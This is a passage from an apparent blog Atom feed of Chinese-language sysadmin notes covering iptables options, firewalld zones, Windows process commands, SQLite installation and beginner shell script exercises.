&#x5730;&#x5740;&#x4F5C;&#x4E3A;&#x6E90;&#x5730;&#x5740;&#xFF0C;&#x6309;&#x6B64;&#x89C4;&#x5219;&#x8FDB;&#x884C;&#x8FC7;&#x6EE4;&#x3002;&#x5F53;&#x540E;&#x9762;&#x6CA1;&#x6709;maks&#x65F6;&#xFF0C;address&#x662F;&#x4E00;&#x4E2A;&#x5730;&#x5740;&#xFF0C;&#x6BD4;&#x5982;192.168.1.1&#xFF1B;&#x5F53;mask&#x6307;&#x5B9A;&#x65F6;&#xFF0C;&#x53EF;&#x4EE5;&#x8868;&#x793A;&#x4E00;&#x7EC4;&#x8303;&#x56F4;&#x5185;&#x7684;&#x5730;&#x5740;&#xFF0C;&#x6BD4;&#x5982;192.168.1.0/255.255.255.0-d&#xFF0C;--destination [!] address[/mask]&#xFF1A;&#x6307;&#x5B9A;&#x76EE;&#x7684;&#x5730;&#x5740;&#xFF0C;&#x6309;&#x6B64;&#x8FDB;&#x884C;&#x8FC7;&#x6EE4;-i&#xFF0C;--in-interface [!] &lt;&#x7F51;&#x7EDC;&#x63A5;&#x53E3;&#x540D;&#x79F0;&gt;&#xFF1A;&#x6307;&#x5B9A;&#x6570;&#x636E;&#x5305;&#x7684;&#x6765;&#x81EA;&#x7684;&#x7F51;&#x7EDC;&#x63A5;&#x53E3;&#xFF0C;&#x6BD4;&#x5982;&#x6700;&#x5E38;&#x89C1;&#x7684;eht0&#x3001;ens33&#x3002;&#x8BE5;&#x9009;&#x9879;&#x53EA;&#x5BF9;INPUT&#x3001;FORWARD&#x3001;PREROUTING&#x8FD9;&#x4E09;&#x4E2A;&#x94FE;&#x8D77;&#x4F5C;&#x7528;-o&#xFF0C;--out-interface [!] &lt;&#x7F51;&#x7EDC;&#x63A5;&#x53E3;&#x540D;&#x79F0;&gt;&#xFF1A;&#x6307;&#x5B9A;&#x6570;&#x636E;&#x5305;&#x51FA;&#x53BB;&#x7684;&#x7F51;&#x7EDC;&#x63A5;&#x53E3;&#x3002;&#x53EA;&#x5BF9;OUTPUT&#x3001;FORWARD&#x3001;POSTROUTING&#x4E09;&#x4E2A;&#x94FE;&#x8D77;&#x4F5C;&#x7528;&#x3002;# &#x67E5;&#x770B;&#x7BA1;&#x7406;&#x547D;&#x4EE4;-L&#xFF0C; --list [chain] &#xFF1A;&#x5217;&#x51FA;&#x94FE;chain&#x4E0A;&#x9762;&#x7684;&#x6240;&#x6709;&#x89C4;&#x5219;&#xFF0C;&#x5982;&#x679C;&#x6CA1;&#x6709;&#x6307;&#x5B9A;&#x94FE;&#xFF0C;&#x5217;&#x51FA;&#x8868;&#x7684;&#x6240;&#x6709;&#x94FE;&#x6240;&#x6709;&#x89C4;&#x5219;&#x3002;# &#x89C4;&#x5219;&#x7BA1;&#x7406;&#x547D;&#x4EE4;-A&#xFF0C;--append chain rule-specification&#xFF1A;&#x5728;&#x6307;&#x5B9A;&#x94FE;chain&#x7684;&#x672B;&#x5C3E;&#x63D2;&#x5165;&#x6307;&#x5B9A;&#x7684;&#x89C4;&#x5219;&#xFF0C;&#x8FD9;&#x6761;&#x89C4;&#x5219;&#x4F1A;&#x88AB;&#x653E;&#x5230;&#x6700;&#x540E;&#xFF0C;&#x6700;&#x540E;&#x624D;&#x6267;&#x884C;&#x3002;-I&#xFF0C;--insert chain [rulenum] rule-specification&#xFF1A;&#x5728;&#x94FE;chain&#x4E2D;&#x7684;&#x6307;&#x5B9A;&#x4F4D;&#x7F6E;&#x63D2;&#x5165;&#x4E00;&#x6761;&#x6216;&#x591A;&#x6761;&#x89C4;&#x5219;&#x3002;&#x5982;&#x679C;&#x6307;&#x5B9A;&#x7684;&#x89C4;&#x5219;&#x53F7;&#x662F;1&#xFF0C;&#x5219;&#x5728;&#x94FE;&#x7684;&#x5934;&#x90E8;&#x63D2;&#x5165;&#x3002;&#x8FD9;&#x4E5F;&#x662F;&#x9ED8;&#x8BA4;&#x7684;&#x60C5;&#x51B5;&#xFF0C;&#x5982;&#x679C;&#x6CA1;&#x6709;&#x6307;&#x5B9A;&#x89C4;&#x5219;&#x53F7;&#x3002;-D&#xFF0C;--delete chain rule-specification/--delete chain rulenum &#xFF1A;&#x5728;&#x6307;&#x5B9A;&#x7684;&#x94FE;chain&#x4E2D;&#x5220;&#x9664;&#x4E00;&#x4E2A;&#x6216;&#x591A;&#x4E2A;&#x6307;&#x5B9A;&#x89C4;&#x5219;-R num&#xFF0C;replays&#xFF1A;&#x66FF;&#x6362;/&#x4FEE;&#x6539;&#x7B2C;&#x51E0;&#x6761;&#x89C4;&#x5219;# &#x94FE;&#x7BA1;&#x7406;&#x547D;&#x4EE4;-P&#xFF0C;--policy chain target&#xFF1A;&#x4E3A;&#x6307;&#x5B9A;&#x7684;&#x94FE;chain&#x8BBE;&#x7F6E;&#x7B56;&#x7565;target&#x3002;&#x6CE8;&#x610F;&#xFF0C;&#x53EA;&#x6709;&#x5185;&#x7F6E;&#x7684;&#x94FE;&#x624D;&#x5141;&#x8BB8;&#x6709;&#x7B56;&#x7565;&#xFF0C;&#x7528;&#x6237;&#x81EA;&#x5B9A;&#x4E49;&#x7684;&#x662F;&#x4E0D;&#x5141;&#x8BB8;&#x7684;&#x3002;-F&#xFF0C;--flush [cahin]&#xFF1A;&#x6E05;&#x7A7A;&#x6307;&#x5B9A;&#x94FE;chain&#x4E0A;&#x9762;&#x7684;&#x6240;&#x6709;&#x89C4;&#x5219;&#x3002;&#x5982;&#x679C;&#x6CA1;&#x6709;&#x6307;&#x5B9A;&#x94FE;&#xFF0C;&#x5219;&#x9ED8;&#x8BA4;&#x6E05;&#x7A7A;&#x6240;&#x6709;&#x94FE;&#x4E0A;&#x7684;&#x89C4;&#x5219;-N&#xFF0C;--new-chain chain&#xFF1A;&#x7528;&#x6307;&#x5B9A;&#x7684;&#x540D;&#x5B57;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x65B0;&#x7684;&#x94FE;-X&#xFF0C;--delete-chain [chain]&#xFF1A;&#x5220;&#x9664;&#x6307;&#x5B9A;&#x7684;&#x94FE;&#xFF0C;&#x8FD9;&#x4E2A;&#x94FE;&#x5FC5;&#x987B;&#x6CA1;&#x6709;&#x88AB;&#x5176;&#x4ED6;&#x4EFB;&#x4F55;&#x89C4;&#x5219;&#x5F15;&#x7528;&#xFF0C;&#x800C;&#x4E14;&#x8FD9;&#x6761;&#x4E0A;&#x5FC5;&#x987B;&#x6CA1;&#x6709;&#x4EFB;&#x4F55;&#x89C4;&#x5219;&#x3002;&#x5982;&#x679C;&#x6CA1;&#x6709;&#x6307;&#x5B9A;&#x94FE;&#x540D;&#xFF0C;&#x9ED8;&#x8BA4;&#x5220;&#x9664;&#x6240;&#x6709;&#x7528;&#x6237;&#x94FE;-E&#xFF0C;--rename-chain old-chain new-chain&#xFF1A;&#x91CD;&#x547D;&#x540D;&#x94FE;&#x3002;&#x8FD9;&#x5E76;&#x4E0D;&#x4F1A;&#x5BF9;&#x5185;&#x90E8;&#x94FE;&#x9020;&#x6210;&#x4EFB;&#x4F55;&#x5F71;&#x54CD;-Z&#xFF0C;--zero [chain]&#xFF1A;&#x628A;&#x6307;&#x5B9A;&#x94FE;&#xFF0C;&#x6216;&#x8868;&#x4E2D;&#x7684;&#x6240;&#x6709;&#x94FE;&#x7684;&#x6240;&#x6709;&#x8BA1;&#x6570;&#x5668;&#x6E05;&#x96F6;&#x3002;-j&#xFF0C;--jump target &lt;&#x6307;&#x5B9A;&#x76EE;&#x6807;&gt;&#xFF1A;&#x53CA;&#x6EE1;&#x8DB3;&#x67D0;&#x6761;&#x4EF6;&#x65F6;&#x8BE5;&#x6267;&#x884C;&#x4EC0;&#x4E48;&#x6837;&#x7684;&#x52A8;&#x4F5C;&#x3002;target&#x53EF;&#x4EE5;&#x662F;&#x5185;&#x7F6E;&#x7684;&#x76EE;&#x6807;&#xFF0C;&#x6BD4;&#x5982;ACCEPT&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x662F;&#x7528;&#x6237;&#x81EA;&#x5B9A;&#x4E49;&#x7684;&#x94FE;&#x3002;</code></pre><p><strong>&#x683C;&#x5F0F;</strong></p><pre><code>iptables -t &#x8868;&#x540D; &lt;-A/I/D/R&gt; &#x89C4;&#x5219;&#x94FE;&#x540D; [&#x89C4;&#x5219;&#x53F7;] &lt;-i/o &#x7F51;&#x5361;&#x540D;&gt; -p &#x534F;&#x8BAE;&#x540D; &lt;-s &#x6E90;IP/&#x6E90;&#x5B50;&#x7F51;&gt;  --sport &#x6E90;&#x7AEF;&#x53E3; &lt;-d &#x76EE;&#x6807;IP/&#x76EE;&#x6807;&#x5B50;&#x7F51;&gt; --dport &#x76EE;&#x6807;&#x7AEF;&#x53E3; -j &#x52A8;&#x4F5C;</code></pre><h2 id="iptables-restore"><a href="#iptables-restore" class="headerlink" title="iptables-restore"></a>iptables-restore</h2><h2 id="iptables-save"><a href="#iptables-save" class="headerlink" title="iptables-save"></a>iptables-save</h2><h2 id="iptstate"><a href="#iptstate" class="headerlink" title="iptstate"></a>iptstate</h2><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;iptables&quot;&gt;&lt;a href=&quot;#iptables&quot; class=&quot;headerlink&quot; title=&quot;iptables&quot;&gt;&lt;/a&gt;iptables&lt;/h2&gt;&lt;h3 id=&quot;iptables&amp;#x7684;&amp;#x56DB;&amp;#x8868;&amp;#x4E94;&amp;
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>firewalld学习笔记</title>
    <link href="https://marnm.github.io//posts/c7b4ec91/"/>
    <id>https://marnm.github.io//posts/c7b4ec91/</id>
    <published>2022-06-07T04:53:28.000Z</published>
    <updated>2022-06-07T05:02:37.310Z</updated>
    
    <content type="html"><![CDATA[<h1 id="FirewallD"><a href="#FirewallD" class="headerlink" title="FirewallD"></a>FirewallD</h1><p>RHEL 7&#x7CFB;&#x7EDF;&#x4E2D;&#x96C6;&#x6210;&#x4E86;&#x591A;&#x6B3E;&#x9632;&#x706B;&#x5899;&#x7BA1;&#x7406;&#x5DE5;&#x5177;&#xFF0C;&#x5176;&#x4E2D;firewalld&#xFF08;Dynamic Firewall Manager of Linux Systems&#xFF0C;Linux&#x7CFB;&#x7EDF;&#x52A8;&#x6001;&#x9632;&#x706B;&#x5899;&#x7BA1;&#x7406;&#x5668;&#xFF09;&#x670D;&#x52A1;&#x662F;&#x9ED8;&#x8BA4;&#x7684;&#x9632;&#x706B;&#x5899;&#x914D;&#x7F6E;&#x7BA1;&#x7406;&#x5DE5;&#x5177;&#xFF0C;&#x5B83;&#x62E5;&#x6709;&#x57FA;&#x4E8E;CLI&#xFF08;&#x547D;&#x4EE4;&#x884C;&#x754C;&#x9762;&#xFF09;&#x548C;&#x57FA;&#x4E8E;GUI&#xFF08;&#x56FE;&#x5F62;&#x7528;&#x6237;&#x754C;&#x9762;&#xFF09;&#x7684;&#x4E24;&#x79CD;&#x7BA1;&#x7406;&#x65B9;&#x5F0F;&#x3002;</p><p>FirewallD&#x662F;CentOS 7&#x7684;&#x4E00;&#x5927;&#x7279;&#x6027;&#xFF0C;&#x6700;&#x5927;&#x7684;&#x597D;&#x5904;&#x662F;&#x652F;&#x6301;&#x52A8;&#x6001;&#x66F4;&#x65B0;&#xFF0C;&#x4E0D;&#x7528;&#x91CD;&#x542F;&#x670D;&#x52A1;&#xFF1B;&#x52A0;&#x5165;&#x4E86;&#x9632;&#x706B;&#x5899;&#x201C;zone&#x201D;&#x7684;&#x6982;&#x5FF5;</p><p>&#x76F8;&#x8F83;&#x4E8E;&#x4F20;&#x7EDF;&#x7684;&#x9632;&#x706B;&#x5899;&#x7BA1;&#x7406;&#x914D;&#x7F6E;&#x5DE5;&#x5177;&#xFF0C;firealld&#x6240;&#x652F;&#x6301;&#x52A8;&#x6001;&#x66F4;&#x65B0;&#x6280;&#x672F;&#x5E76;&#x52A0;&#x5165;&#x4E86;&#x533A;&#x57DF;&#xFF08;zone&#xFF09;&#x7684;&#x6982;&#x5FF5;&#x3002;&#x7B80;&#x5355;&#x6765;&#x8BF4;&#xFF0C;&#x533A;&#x57DF;&#x5C31;&#x662F;firewalld&#x9884;&#x5148;&#x51C6;&#x5907;&#x4E86;&#x51E0;&#x5957;&#x9632;&#x706B;&#x5899;&#x7B56;&#x7565;&#x96C6;&#x5408;&#xFF08;&#x7B56;&#x7565;&#x6A21;&#x677F;&#xFF09;&#xFF0C;&#x7528;&#x6237;&#x53EF;&#x4EE5;&#x6839;&#x636E;&#x751F;&#x4EA7;&#x573A;&#x666F;&#x7684;&#x4E0D;&#x540C;&#x800C;&#x9009;&#x62E9;&#x5408;&#x9002;&#x7684;&#x7B56;&#x7565;&#x96C6;&#x5408;&#xFF0C;&#x4ECE;&#x800C;&#x5B9E;&#x73B0;&#x9632;&#x706B;&#x5899;&#x7B56;&#x7565;&#x7684;&#x5FEB;&#x901F;&#x5207;&#x6362;&#x3002;&#x4F8B;&#x5982;&#xFF0C;&#x6211;&#x4EEC;&#x6709;&#x4E00;&#x53F0;&#x7B14;&#x8BB0;&#x672C;&#x7535;&#x8111;&#xFF0C;&#x6BCF;&#x5929;&#x90FD;&#x8981;&#x5728;&#x529E;&#x516C;&#x5BA4;&#x3001;&#x5496;&#x5561;&#x5385;&#x548C;&#x5BB6;&#x91CC;&#x4F7F;&#x7528;&#x3002;&#x6309;&#x5E38;&#x7406;&#x6765;&#x8BF4;&#xFF0C;&#x8FD9;&#x4E09;&#x8005;&#x7684;&#x5B89;&#x5168;&#x6027;&#x6309;&#x7167;&#x7531;&#x9AD8;&#x5230;&#x4F4E;&#x7684;&#x987A;&#x5E8F;&#x6765;&#x6392;&#x5217;&#xFF0C;&#x5E94;&#x8BE5;&#x662F;&#x5BB6;&#x5EAD;&#x3001;&#x516C;&#x53F8;&#x529E;&#x516C;&#x5BA4;&#x3001;&#x5496;&#x5561;&#x5385;&#x3002;&#x5F53;&#x524D;&#xFF0C;&#x6211;&#x4EEC;&#x5E0C;&#x671B;&#x4E3A;&#x8FD9;&#x53F0;&#x7B14;&#x8BB0;&#x672C;&#x7535;&#x8111;&#x6307;&#x5B9A;&#x5982;&#x4E0B;&#x9632;&#x706B;&#x5899;&#x7B56;&#x7565;&#x89C4;&#x5219;&#xFF1A;</p><ul><li>&#x5728;&#x5BB6;&#x4E2D;&#x5141;&#x8BB8;&#x8BBF;&#x95EE;&#x6240;&#x6709;&#x670D;&#x52A1;&#xFF1B;&#x5728;&#x529E;&#x516C;&#x5BA4;&#x5185;&#x4EC5;&#x5141;&#x8BB8;&#x8BBF;&#x95EE;&#x6587;&#x4EF6;&#x5171;&#x4EAB;&#x670D;&#x52A1;&#xFF1B;&#x5728;&#x5496;&#x5561;&#x5385;&#x4EC5;&#x5141;&#x8BB8;&#x4E0A;&#x7F51;&#x6D4F;&#x89C8;&#x3002;&#x5728;&#x4EE5;&#x5F80;&#xFF0C;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x9891;&#x7E41;&#x7684;&#x624B;&#x52A8;&#x8BBE;&#x7F6E;&#x9632;&#x706B;&#x5899;&#x7B56;&#x7565;&#x89C4;&#x5219;&#xFF0C;&#x800C;&#x73B0;&#x5728;&#x53EA;&#x9700;&#x8981;&#x9884;&#x8BBE;&#x597D;&#x533A;&#x57DF;&#x96C6;&#x5408;&#xFF0C;&#x7136;&#x540E;&#x53EA;&#x9700;&#x8F7B;&#x70B9;&#x9F20;&#x6807;&#x5C31;&#x53EF;&#x4EE5;&#x81EA;&#x52A8;&#x5207;&#x6362;&#x4E86;&#xFF0C;&#x4ECE;&#x800C;&#x6781;&#x5927;&#x63D0;&#x5347;&#x4E86;&#x9632;&#x706B;&#x5899;&#x7B56;&#x7565;&#x7684;&#x5E94;&#x7528;&#x6548;&#x7387;&#x3002;</li><li>firewalld&#x4E2D;&#x5E38;&#x89C1;&#x7684;&#x533A;&#x57DF;&#x540D;&#x79F0;&#xFF08;&#x9ED8;&#x8BA4;&#x4E3A;public&#xFF09;&#x4EE5;&#x53CA;&#x76F8;&#x5E94;&#x7684;&#x7B56;&#x7565;&#x89C4;&#x5219;&#x8868;&#x5982;2&#x6240;&#x793A;&#xFF1A;</li></ul><p>&#x8868;2. firewalld&#x4E2D;&#x5E38;&#x7528;&#x7684;&#x533A;&#x57DF;&#x540D;&#x79F0;&#x4EE5;&#x53CA;&#x7B56;&#x7565;&#x89C4;&#x5219;</p><table><thead><tr><th>&#x533A;&#x57DF;</th><th>&#x9ED8;&#x8BA4;&#x89C4;&#x5219;&#x7B56;&#x7565;</th></tr></thead><tbody><tr><td>trusted</td><td>&#x5141;&#x8BB8;&#x6240;&#x6709;&#x7684;&#x6570;&#x636E;&#x5305;&#x6D41;&#x5165;&#x4E0E;&#x6D41;&#x51FA;</td></tr><tr><td>home</td><td>&#x62D2;&#x7EDD;&#x6D41;&#x5165;&#x7684;&#x6D41;&#x91CF;&#xFF0C;&#x9664;&#x975E;&#x4E0E;&#x6D41;&#x51FA;&#x7684;&#x6D41;&#x91CF;&#x76F8;&#x5173;&#xFF1B;&#x800C;&#x5982;&#x679C;&#x6D41;&#x91CF;&#x4E0E;ssh&#x3001;mdns&#x3001;ipp-client&#x3001;samba-client&#x4E0E;dhcpv6-client&#x670D;&#x52A1;&#x76F8;&#x5173;&#xFF0C;&#x5219;&#x5141;&#x8BB8;&#x6D41;&#x91CF;</td></tr><tr><td>internal</td><td>&#x7B49;&#x540C;&#x4E8E;home&#x533A;&#x57DF;</td></tr><tr><td>work</td><td>&#x62D2;&#x7EDD;&#x6D41;&#x5165;&#x7684;&#x6D41;&#x91CF;&#xFF0C;&#x9664;&#x975E;&#x4E0E;&#x6D41;&#x51FA;&#x7684;&#x6D41;&#x91CF;&#x6570;&#x76F8;&#x5173;&#xFF1B;&#x800C;&#x5982;&#x679C;&#x6D41;&#x91CF;&#x4E0E;ssh&#x3001;ipp-client&#x4E0E;dhcpv6-client&#x670D;&#x52A1;&#x76F8;&#x5173;&#xFF0C;&#x5219;&#x5141;&#x8BB8;&#x6D41;&#x91CF;</td></tr><tr><td>public</td><td>&#x62D2;&#x7EDD;&#x6D41;&#x5165;&#x7684;&#x6D41;&#x91CF;&#xFF0C;&#x9664;&#x975E;&#x4E0E;&#x6D41;&#x51FA;&#x7684;&#x6D41;&#x91CF;&#x76F8;&#x5173;&#xFF1B;&#x800C;&#x5982;&#x679C;&#x6D41;&#x91CF;&#x4E0E;ssh&#x3001;dchpv6-client&#x670D;&#x52A1;&#x76F8;&#x5173;&#xFF0C;&#x5219;&#x5141;&#x8BB8;&#x6D41;&#x91CF;</td></tr></tbody></table><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;FirewallD&quot;&gt;&lt;a href=&quot;#FirewallD&quot; class=&quot;headerlink&quot; title=&quot;FirewallD&quot;&gt;&lt;/a&gt;FirewallD&lt;/h1&gt;&lt;p&gt;RHEL 7&amp;#x7CFB;&amp;#x7EDF;&amp;#x4E2D;&amp;#x96C6;&amp;#x6
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Windows进程管理</title>
    <link href="https://marnm.github.io//posts/6ed6984b/"/>
    <id>https://marnm.github.io//posts/6ed6984b/</id>
    <published>2022-06-07T04:53:05.000Z</published>
    <updated>2022-06-07T05:03:00.960Z</updated>
    
    <content type="html"><![CDATA[<p>&#x67E5;&#x770B;&#x6307;&#x5B9A;&#x7AEF;&#x53E3;&#x7684;&#x8FDB;&#x7A0B;</p><pre><code>netstat -ano | findstr &quot;8080&quot;</code></pre><p>&#x67E5;&#x770B;&#x8FDB;&#x7A0B;&#x8BE6;&#x7EC6;&#x7A0B;&#x5E8F;</p><pre><code>tasklikst | findstr &quot;PID_NUM&quot;</code></pre><p>&#x7ED3;&#x675F;&#x8FDB;&#x7A0B;</p><pre><code>taskkill /T /F /PID pid_num</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&amp;#x67E5;&amp;#x770B;&amp;#x6307;&amp;#x5B9A;&amp;#x7AEF;&amp;#x53E3;&amp;#x7684;&amp;#x8FDB;&amp;#x7A0B;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;netstat -ano | findstr &amp;quot;8080&amp;quot;
&lt;/code&gt;&lt;/
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>SQLite安装</title>
    <link href="https://marnm.github.io//posts/aa142b64/"/>
    <id>https://marnm.github.io//posts/aa142b64/</id>
    <published>2022-06-07T04:52:54.000Z</published>
    <updated>2022-06-07T05:03:23.173Z</updated>
    
    <content type="html"><![CDATA[<p>&#x4E0B;&#x8F7D;&#x5730;&#x5740;<a href="https://www.sqlite.org/download.html" target="_blank" rel="noopener">https://www.sqlite.org/download.html</a></p><p>&#x6E90;&#x7801;&#x5B89;&#x88C5;</p><figure class="highlight sh"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">tar -zxvf sqlite-autoconf-xxx.tar.gz</span><br><span class="line"><span class="built_in">cd</span> sqlite-autoconf-xxx</span><br><span class="line">./configure --prefix=/usr/<span class="built_in">local</span></span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></tbody></table></figure><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&amp;#x4E0B;&amp;#x8F7D;&amp;#x5730;&amp;#x5740;&lt;a href=&quot;https://www.sqlite.org/download.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.sqlite.org/down
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>SHELL脚本练习</title>
    <link href="https://marnm.github.io//posts/8a8ba1e/"/>
    <id>https://marnm.github.io//posts/8a8ba1e/</id>
    <published>2022-06-07T04:52:40.000Z</published>
    <updated>2022-06-07T05:03:43.249Z</updated>
    
    <content type="html"><![CDATA[<p><strong>Hello World</strong><br></p><figure class="highlight sh"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">&lt;!--more--&gt;</span><br><span class="line"><span class="keyword">function</span> example {</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Hello World&quot;</span></span><br><span class="line">}</span><br><span class="line">example</span><br></pre></td></tr></tbody></table></figure><p></p><hr><p><strong>&#x7528;&#x6237;&#x731C;&#x6570;&#x5B57;</strong></p><figure class="highlight sh"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># &#x811A;&#x672C;&#x751F;&#x6210;&#x4E00;&#x4E2A;100&#x4EE5;&#x5185;&#x7684;&#x968F;&#x673A;&#x6570;&#xFF0C;&#x63D0;&#x793A;&#x7528;&#x6237;&#x731C;&#x6570;&#x5B57;&#xFF0C;&#x6839;&#x636E;&#x7528;&#x6237;&#x7684;&#x8F93;&#x5165;&#xFF0C;&#x63D0;&#x793A;&#x7528;&#x6237;&#x731C;&#x5BF9;&#x4E86;&#x3002;</span></span><br><span class="line"><span class="comment"># &#x731C;&#x5C0F;&#x4E86;&#x6216;&#x731C;&#x5927;&#x4E86;&#xFF0C;&#x76F4;&#x81F3;&#x7528;&#x6237;&#x731C;&#x5BF9; &#x811A;&#x672C;&#x7ED3;&#x675F;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># RANDOM &#x4E3A;&#x7CFB;&#x7EDF;&#x81EA;&#x5E26;&#x7684;&#x7CFB;&#x7EDF;&#x53D8;&#x91CF;&#xFF0C;&#x503C;&#x4E3A;0-32767&#x7684;&#x968F;&#x673A;&#x6570;</span></span><br><span class="line"><span class="comment"># &#x4F7F;&#x7528;&#x53D6;&#x4F59;&#x7B97;&#x6CD5;&#x5C06;&#x968F;&#x673A;&#x6570;&#x53D8;&#x4E3A;1-100&#x7684;&#x968F;&#x673A;&#x6570;</span></span><br><span class="line">num=$[ RANDOM%100+1 ]</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$num</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># &#x4F7F;&#x7528; read &#x63D0;&#x793A;&#x7528;&#x6237;&#x731C;&#x6570;&#x5B57;</span></span><br><span class="line"><span class="comment"># &#x4F7F;&#x7528; if &#x5224;&#x65AD;&#x7528;&#x6237;&#x731C;&#x6570;&#x5B57;&#x7684;&#x5927;&#x5C0F;&#x5173;&#x7CFB;&#xFF1A; </span></span><br><span class="line"><span class="comment"># -eq&#xFF08;&#x7B49;&#x4E8E;&#xFF09;, -ne&#xFF08;&#x4E0D;&#x7B49;&#x4E8E;&#xFF09;&#xFF0C;-gt&#xFF08;&#x5927;&#x4E8E;&#xFF09;,-lt&#x5C0F;&#x4E8E;&#xFF0C;-le&#xFF08;&#x5C0F;&#x4E8E;&#x7B49;&#x4E8E;&#xFF09;</span></span><br><span class="line"><span class="keyword">while</span> :</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    <span class="built_in">read</span> -p <span class="string">&quot;&#x8BA1;&#x7B97;&#x673A;&#x751F;&#x6210;&#x4E86;&#x4E00;&#x4E2A;1-100&#x7684;&#x968F;&#x673A;&#x6570;&#xFF0C;&#x4F60;&#x731C;&#xFF1A;&quot;</span> guess</span><br><span class="line">    <span class="keyword">if</span> [ <span class="variable">$guess</span> -eq <span class="variable">$num</span> ]</span><br><span class="line">    <span class="keyword">then</span> <span class="built_in">echo</span> <span class="string">&quot;&#x606D;&#x559C;&#xFF0C;&#x731C;&#x5BF9;&#x4E86;&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> [ <span class="variable">$guess</span> -gt <span class="variable">$num</span> ]</span><br><span class="line">    <span class="keyword">then</span> <span class="built_in">echo</span> <span class="string">&quot;Oops&#xFF0C;&#x731C;&#x5927;&#x4E86;&quot;</span></span><br><span class="line">    <span class="keyword">else</span> <span class="built_in">echo</span> <span class="string">&quot;Oops, &#x731C;&#x5C0F;&#x4E86;&quot;</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></tbody></table></figure><hr><p><strong>&#x526A;&#x5200;&#x77F3;&#x5934;&#x5E03; &#x6E38;&#x620F;</strong><br></p><figure class="highlight sh"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">game=(&#x526A;&#x5200; &#x77F3;&#x5934; &#x5E03;)</span><br><span class="line">num=$[ RANDOM%3 ]</span><br><span class="line">computer=<span class="variable">${ 